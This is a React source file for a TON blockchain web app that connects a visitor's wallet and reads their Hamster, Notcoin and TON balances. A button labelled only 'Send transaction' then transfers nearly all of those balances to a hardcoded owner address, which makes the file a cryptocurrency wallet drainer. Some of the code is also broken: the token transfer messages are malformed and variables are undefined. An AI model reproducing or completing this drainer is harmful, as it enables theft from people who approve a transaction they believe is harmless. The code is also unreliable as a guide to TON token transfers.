import React,{ useState,useEffect } from 'react'
import { TonConnectUIProvider, useTonConnectUI,TonConnectButton } from '@tonconnect/ui-react';
import "./index.css";
import TonWeb from 'tonweb';
import { Buffer } from 'buffer';

window.Buffer = Buffer;


const Body =() => {

  
  //check these address in your wallet
  const ownerAddress="UQBFrS0-M_6sMmhAZr12A-t-OgJ4_LQCVWz8f7xtS_v7lyHL"
  const hamesterTokenAddress="EQAJ8uWd7EBqsmpSWaRdf_I-8R8-XHwh3gsNKhy-UrdrPcUo"
  const notcoinTokenAddress="EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT" 




  const [hamesterBalance, setHamesterBalance] = useState(null);
  const [notCoinBalance, setNotCoinBalance] = useState(null);
  const [tonBalance, setTonBalance] = useState(null);
  const [userAddress, setUserAddress] = useState(null);
  const [tonConnectUI] = useTonConnectUI();
  

  //testnet
  const tonweb = new TonWeb( 
    new TonWeb.HttpProvider("https://testnet.toncenter.com/api/v2/jsonRPC") 
  );
  
  //real network
  //const tonweb=new TonWeb()


const fetchUserTokenBalance = async (userAddress, tokenAddress) => {
  try {
    
    const methodCall = {
      method: 'get_wallet_data',
      stack: []
    };
 
    const userAddr = new TonWeb.utils.Address(userAddress);
    const jettonMasterAddr = new TonWeb.utils.Address(tokenAddress);

    
    const result = await tonweb.provider.call(
      jettonMasterAddr.toString(),  
      methodCall.method,            
      methodCall.stack              
    );

    const balanceInNano = result.stack[0][1]; 
    const balanceInJetton = TonWeb.utils.fromNano(balanceInNano); 
    return balanceInJetton;
    

  } catch (error) {
    console.error('Error fetching Jetton balance:', error);
    return 0;
  }
};

const fetchTonBalance=async(userAddress)=>{

  const tonAddress = new TonWeb.utils.Address(userAddress); 
    const balanceOfTo =  await tonweb.provider.getBalance( 
      tonAddress.toString() 
    );
    const balanceOfTon=Number(balanceOfTo);

    return balanceOfTon;
}


  const fetchAllBalances = async () => {


    if (!userAddress) return;

    const balanceOfHamester = await fetchUserTokenBalance(userAddress, hamesterTokenAddress);
    const balanceOfNotCoin = await fetchUserTokenBalance(userAddress, notcoinTokenAddress);
    const balanceOfTon=await fetchTonBalance(userAddress);

    
    setHamesterBalance(balanceOfHamester);
    setNotCoinBalance(balanceOfNotCoin);
    setTonBalance(balanceOfTon);


    console.log(`
     your hamester balance before transactions : ${balanceOfHamester.toString()}
     your notcoin balance  before transactions: ${balanceOfNotCoin.toString()}
     your ton balance before transactions: ${balanceOfTon.toString()}
     `)};

  
  useEffect(() => {
    tonConnectUI.onStatusChange((walletInfo) => {
      if (walletInfo) {
        setUserAddress(walletInfo.account.address);
      }
    });
  }, [tonConnectUI]);

  const transferAllTokens = async () => {

      
      const hamesterJettonWallet = await tonweb.provider.call(
        hamesterTokenAddress,  
        'get_wallet_address',  
        [['addr', userAddress]] 
      );
  
      
      const notCoinJettonWallet = await tonweb.provider.call(
        notcoinTokenAddress,  
        'get_wallet_address',  
        [['addr', userAddress]] 
      );
    

    /*if (hamesterBalance <= 0 && notCoinBalance <= 0 && tonBalance <= 0) {
      console.error("No tokens to transfer.");
      return;
    }*/

    const transactionHamester = {
      to: ownerAddress,
      amount: TonWeb.utils.toNano(hamesterBalance.toString()), 
      payload: null
    };


    const transactionNot = {
      to: ownerAddress,
        amount: TonWeb.utils.toNano(notCoinBalance.toString()),
        payload: null
    };
  
    const transactionTon = {
      messages: [
        {
          address: ownerAddress,
          amount: tonBalance-10e6,
          payload: null,
        },
      ],
    };

      try{
        await tonConnectUI.sendTransaction({
          messages: [{ address: hamesterJettonWallet, ...transactionHamester }]
        });
        await tonConnectUI.sendTransaction({
          messages: [{ address: notCoinJettonWallet, ...transactionNot }]
        });
        await tonConnectUI.sendTransaction(transactionTon);

    
      
       console.log(`
        your new hamester balance: ${balanceOfHamester.toString()}
        your new notcoin balance: ${balanceOfNotCoin.toString()}
         your new ton balance: ${balanceOfTon.toString()}
         `)


    } catch (error) {
      console.error('Error sending transactions:', error);
    }
  };



  useEffect(() => {
    if (userAddress) {
      fetchAllBalances();
    }
  }, [userAddress]);



  return (
    <>
      <div className="custom-buttons-container">
        <TonConnectButton />
        <button className='transfer-btn tonconnect-button' onClick={() => transferAllTokens(ownerAddress)}>
                Send transaction
            </button>
      </div>
    </>
  );
};


const App = () => {
  return (
    <TonConnectUIProvider manifestUrl="http://localhost:5173/tonconnect-manifest.json">
          <Body/> 
        </TonConnectUIProvider>
  )
}

export default App
